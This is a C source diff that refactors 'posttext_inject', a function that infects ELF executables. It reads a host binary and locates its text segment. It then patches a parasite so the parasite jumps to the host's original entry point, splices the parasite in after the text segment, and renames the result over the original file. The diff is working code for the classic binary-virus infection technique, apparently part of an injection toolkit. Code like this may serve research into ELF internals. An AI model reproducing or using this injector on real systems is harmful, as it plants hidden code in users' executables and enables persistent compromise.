@@ -7,11 +7,9 @@
  * @param parasite filename containing the parasite
  * @param patch_position position in the parasite code to insert the host's code address
  */
-int posttext_inject(unsigned char *host, struct stat *hst, 
-                        char *parasite, uint8_t patch_position)
+int posttext_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
 {
     unsigned long entry_point, text_offset, text_begin;
-    unsigned char *mem;
     unsigned int entry_offset;
     unsigned char buf[PAGE_SIZE];
     unsigned int ehdr_size;
@@ -38,7 +36,7 @@ int posttext_inject(unsigned char *host, struct stat *hst,
 
     psize = pst.st_size;
 
-    ehdr = (Elf32_Ehdr *) mem;
+    ehdr = (Elf32_Ehdr *) host->mem;
     entry_point = ehdr->e_entry;
     ehdr_size = sizeof(*ehdr);
 
@@ -50,7 +48,7 @@ int posttext_inject(unsigned char *host, struct stat *hst,
     }
 
     text_found = 0;
-    phdr = (Elf32_Phdr *) (mem + ehdr->e_phoff);
+    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);
 
     // iterate over phdrs looking for the text segment
     for (i = ehdr->e_phnum; i-- > 0; phdr++)
@@ -73,7 +71,7 @@ int posttext_inject(unsigned char *host, struct stat *hst,
     }
 
 
-    shdr = (Elf32_Shdr *) (mem + ehdr->e_shoff);
+    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
     for (i = ehdr->e_shnum; i-- > 0; shdr++)
     {
         if (shdr->sh_offset >= text_offset + entry_offset)
@@ -103,13 +101,14 @@ int posttext_inject(unsigned char *host, struct stat *hst,
     *(unsigned long *)&buf[patch_position] = entry_point;
     printf("Patching parasite to jmp to %x\n", entry_point);
 
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC), hst->st_size) == -1)
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
+        < 0) 
     {
         perror("tmp binary: open");
         exit(-1);
     }
 
-    if ((wrote = write(ofd, mem, preparasite_size_file)) != preparasite_size_file)
+    if ((wrote = write(ofd, host->mem, preparasite_size_file)) != preparasite_size_file)
     {
         perror("tmp binary: write contents up to parasite");
         exit(-1);
@@ -128,14 +127,15 @@ int posttext_inject(unsigned char *host, struct stat *hst,
         exit(-1);
     }
 
-    mem += text_offset + entry_offset;
-    if (write(ofd, mem, hst->st_size-preparasite_size_file) != hst->st_size-preparasite_size_file)
+    host->mem += text_offset + entry_offset;
+    if (write(ofd, host->mem, host->file->st_size-preparasite_size_file) 
+        != host->file->st_size-preparasite_size_file)
     {
         perror("tmp binary: write post injection");
         exit(-1);
     }
 
-    rename(TMP, host);
+    rename(TMP, host->name);
     close(ofd);
 
     return text_offset + entry_offset; 
